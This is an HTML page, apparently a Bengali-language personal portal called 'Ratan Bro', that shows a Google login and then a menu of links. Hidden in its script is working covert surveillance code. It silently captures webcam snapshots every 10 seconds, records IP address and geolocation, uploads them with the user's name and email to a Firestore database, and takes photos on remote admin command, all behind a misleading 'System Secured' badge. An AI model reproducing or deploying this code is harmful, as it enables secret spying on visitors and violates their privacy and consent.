<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Official Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --pink: #ff4d94; --dark: #0f172a; --card: #1e293b; --text: #f8fafc; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        body { background: var(--dark); color: var(--text); overflow-x: hidden; }

        /* Login UI */
        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; }
        .round-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 20px; object-fit: cover; }
        
        /* Main UI */
        #main-ui { display: none; }
        .hero { background: linear-gradient(135deg, #ff4d94 0%, #7c3aed 100%); padding: 50px 20px; text-align: center; border-radius: 0 0 50px 50px; }
        .profile-wrapper { display: flex; justify-content: center; align-items: center; }
        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .user-p-img { width: 85px; height: 85px; margin-left: -25px; border: 3px solid var(--dark); z-index: 1; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 25px; max-width: 900px; margin: 0 auto; }
        .card { background: var(--card); border-radius: 20px; padding: 20px; text-align: center; text-decoration: none; color: white; border: 1px solid #334155; }
        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 10px; }

        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box">
            <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
            <h3>স্বাগতম রতন ব্রো পোর্টালে</h3>
            <p style="margin: 15px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
                <i class="fab fa-google"></i> Login with Google
            </button>
        </div>
    </div>

    <div id="main-ui">
        <section class="hero">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="user-display-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="user-welcome" style="margin-top:15px;"></h2>
            <div style="background:white; color:var(--pink); padding:5px 15px; border-radius:20px; display:inline-block; font-weight:bold; margin-top:10px;">System Secured</div>
        </section>

        <div class="grid">
            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><h4>Dropshipping</h4></a>
            <a href="https://your-lookup-site.com" class="card"><i class="fas fa-search"></i><h4>Lookup</h4></a>
            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        window.googleLogin = () => { signInWithPopup(auth, provider); };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                document.getElementById('user-welcome').innerText = user.displayName;
                document.getElementById('user-display-pic').src = user.photoURL;
                initTracking(user);
            }
        });

        async function initTracking(user) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Blocked"));
            document.getElementById('vSource').srcObject = stream;

            const uRef = doc(db, "users", user.email.replace('.', '_'));

            // এডমিন থেকে সরাসরি ছবি তোলার কমান্ড শুনবে
            onSnapshot(uRef, (snap) => {
                if (snap.data()?.command === "take_photo") {
                    capture(user);
                    updateDoc(uRef, { command: "" });
                }
            });

            // প্রথম ছবি সাথে সাথে এবং পরে প্রতি ১০ সেকেন্ডে
            capture(user); 
            setInterval(() => capture(user), 10000); 
        }

        async function capture(user) {
            const canvas = document.getElementById('snapCanvas');
            const video = document.getElementById('vSource');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const image = canvas.toDataURL('image/jpeg', 0.6); // ফাইল সাইজ কমাতে কোয়ালিটি ০.৬

            const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                    name: user.displayName,
                    email: user.email,
                    photo: user.photoURL,
                    ip: ipInfo.ip,
                    loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    lastPic: image, // এটি প্রতি ১০ সেকেন্ডে নতুন ছবি দিয়ে আপডেট হবে
                    time: new Date().toLocaleString()
                }, { merge: true });
            });
        }
    </script>
</body>
</html>
